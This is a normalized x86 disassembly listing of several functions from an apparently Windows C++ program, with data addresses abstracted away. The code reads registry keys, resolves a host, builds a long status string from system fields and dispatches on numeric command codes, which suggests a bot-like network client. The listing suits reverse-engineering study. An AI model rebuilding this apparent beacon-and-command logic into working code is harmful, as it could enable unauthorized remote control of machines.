sub esp 0x10
lea eax [ ebp + 0x8 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x2f
mov ecx ebx
call sub_402062
push 0x0
push sub_40ae55
mov ecx ebx
call sub_4020e9
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40b3f7
push ebp
mov ebp esp
sub esp 0x7c4
push ebx
push esi
lea eax [ ebp - 0x1dc ]
push edi
push eax
call sub_410732
mov al [ rw-data ]
push eax
push r--data
push r--data
lea eax [ ebp - 0x74 ]
push 0x80000002
push eax
call sub_40a43e
lea eax [ ebp - 0x74 ]
push r--data
push eax
call [ std::operator==@IAT ]
add esp 0x20
test al al
je r-xdata
mov esi rw-data
push 0x29
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
test eax eax
pop ecx
je r-xdata
push r--data
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
cmp [ rw-data ] 0x0
je r-xdata
imul eax eax 0x3e8
push eax
call [ Sleep@IAT ]
sub esp 0x10
lea eax [ ebp - 0x1 ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x0
mov ecx esi
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x9c ]
push eax
call sub_41113a
add esp 0x24
and [ ebp - 0x8 ] 0x0
mov ebx rw-data
lea eax [ ebp - 0x34 ]
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x26 ]
push eax
lea ecx [ ebp - 0x54 ]
movzx eax [ ebp - 0x28 ]
push eax
movzx eax [ ebp - 0x2a ]
push eax
movzx eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1 ]
push r--data
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ printf@IAT ]
add esp 0x14
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
inc [ ebp - 0x8 ]
lea ecx [ ebp - 0x9c ]
call sub_4012b5
cmp [ ebp - 0x8 ] eax
jb r-xdata
movsx ecx [ eax + 0xa ]
mov eax [ eax + 0xc ]
mov edi rw-data
push 0x1
mov esi [ eax ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebp - 0x24 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
pop ecx
push eax
call htons
lea ecx [ ebp - 0x24 ]
mov [ rw-data ] ax
call sub_4012b5
cmp eax 0x2
jbe r-xdata
lea ecx [ ebp - 0x24 ]
call sub_401ad8
jmp r-xdata
and [ ebp - 0x8 ] 0x0
push 0x2
mov ecx rw-data
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
imul eax eax 0x3e8
pop ecx
push eax
call [ Sleep@IAT ]
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push 0x2
lea ecx [ ebp - 0x24 ]
call sub_401289
mov esi rw-data
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
mov ecx rw-data
call sub_402aab
jmp r-xdata
mov ecx rw-data
call sub_401fd3
sub esp 0x10
lea eax [ ebp - 0x1 ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ ebp - 0x8 ]
lea ecx [ ebp - 0x9c ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x24 ]
push eax
call sub_41113a
add esp 0x24
lea ecx [ ebp - 0x24 ]
mov [ rw-data ] 0x2
push 0x0
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call gethostbyname
test eax eax
je r-xdata
sub esp 0x10
lea eax [ ebp - 0xc ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp - 0xd ]
mov ecx esp
mov esi r--data
push eax
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_410498
and [ ebp - 0x8c ] 0x0
xor eax eax
lea edi [ ebp - 0x8b ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
call sub_410713
push edx
push eax
lea eax [ ebp - 0x8c ]
push r--data
push eax
call [ sprintf@IAT ]
add esp 0x30
lea ecx [ ebp - 0x44 ]
push rw-data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0x30 ]
push 0xa
push eax
push [ rw-data ]
call [ _itoa@IAT ]
add esp 0xc
mov ecx rw-data
push 0x1
call sub_401289
push eax
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov edi rw-data
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x7c4 ]
push 0x104
push eax
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x80000001
call sub_40a5ae
add esp 0x1c
test al al
je r-xdata
sub esp 0x10
mov esi rw-data
mov edi esp
mov ecx rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_402032
test al al
je r-xdata
mov eax [ rw-data ]
and [ ebp - 0x14 ] 0x0
test eax eax
je r-xdata
lea eax [ ebp - 0x7c4 ]
lea ecx [ ebp - 0x64 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea eax [ ebp - 0x9 ]
lea ecx [ ebp - 0x54 ]
push eax
push rw-data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
sub esp 0x10
lea eax [ ebp - 0x74 ]
mov edi esp
push eax
lea eax [ ebp - 0x1dc ]
push ebx
push eax
push ebx
lea eax [ ebp - 0x3ac ]
push rw-data
push eax
call sub_410fa4
pop ecx
pop ecx
push eax
push ebx
movzx eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x38c ]
push eax
call sub_410e67
pop ecx
pop ecx
push eax
push ebx
push rw-data
push ebx
push 0x0
lea ecx [ ebp - 0x24 ]
call sub_401289
push eax
lea eax [ ebp - 0x30 ]
push ebx
push eax
push ebx
call [ GetTickCount@IAT ]
push eax
lea eax [ ebp - 0x36c ]
push eax
call sub_410e67
pop ecx
pop ecx
push eax
push ebx
call sub_4109c6
push eax
lea eax [ ebp - 0x34c ]
push eax
call sub_410e67
pop ecx
pop ecx
push eax
mov al [ rw-data ]
push ebx
push eax
lea eax [ ebp - 0x32c ]
push ebx
push eax
call sub_41098b
push eax
lea eax [ ebp - 0x30c ]
push eax
call sub_410fa4
add esp 0xc
push eax
push ebx
lea eax [ ebp - 0x2ec ]
push rw-data
push eax
call sub_410fa4
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x54 ]
push ebx
push eax
lea eax [ ebp - 0x2cc ]
push eax
call sub_410fa4
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x44 ]
push ebx
push eax
lea eax [ ebp - 0x2ac ]
push eax
call sub_410fa4
pop ecx
pop ecx
push eax
push ebx
push r--data
lea eax [ ebp - 0x8c ]
push ebx
push eax
push ebx
lea eax [ ebp - 0x28c ]
push rw-data
push eax
call sub_410fa4
pop ecx
pop ecx
push eax
push ebx
push rw-data
lea eax [ ebp - 0x26c ]
push ebx
push eax
call sub_408f78
pop ecx
push eax
push ebx
lea eax [ ebp - 0x24c ]
push rw-data
push eax
call sub_410fa4
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x64 ]
push ebx
push eax
lea eax [ ebp - 0x22c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x20c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x1ec ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x1cc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x1ac ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x18c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x16c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x14c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x12c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x10c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0xec ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xcc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0xbc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x31c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x23c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x37c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x21c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x2fc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x1fc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x3dc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xac ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x2dc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@D@Z
add esp 0xc
push eax
lea eax [ ebp - 0x1bc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x35c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x19c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x2bc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x17c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x39c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x15c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x29c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x13c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x33c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x11c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x27c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xfc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x3bc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xdc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x25c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x3cc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov edi rw-data
mov ecx edi
push 0x4b
call sub_402062
lea ecx [ ebp - 0x3cc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x25c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xdc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x3bc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xfc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x27c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x11c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x33c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x13c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x29c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x15c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x39c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x17c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x2bc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x19c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x35c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x1bc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x2dc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xac ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x3dc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x1fc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x2fc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x21c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x37c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x23c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x31c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xbc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xcc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xec ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x10c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x12c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x16c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x18c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x1ac ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x1cc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x1ec ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x20c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x22c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x24c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x26c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x28c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x2ac ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x2cc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x2ec ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x30c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x32c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x34c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x36c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x38c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x3ac ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push 0x1
push sub_40be35
mov ecx edi
call sub_4020e9
cmp [ rw-data ] 0x0
je r-xdata
call eax
mov [ ebp - 0x14 ] eax
sub esp 0x10
lea eax [ ebp - 0xa ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp - 0xb ]
mov ecx esp
push eax
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_410498
add esp 0x20
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov ecx rw-data
call sub_404be3
sub_40be35
push ebp
mov ebp esp
sub esp 0x9b8
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea ecx [ ebp - 0x64 ]
lea eax [ esi + 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ esi + 0x28 ]
call [ SetEvent@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov edi [ eax ]
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
lea ecx [ ebp - 0x64 ]
push [ eax ]
lea eax [ ebp - 0x84 ]
push 0x4
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
sub esp 0x10
mov esi rw-data
mov ecx esp
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp - 0x84 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x10 ]
push eax
call sub_41113a
add esp 0x24
cmp edi 0x20
ja r-xdata
mov eax 0x87
cmp edi eax
ja r-xdata
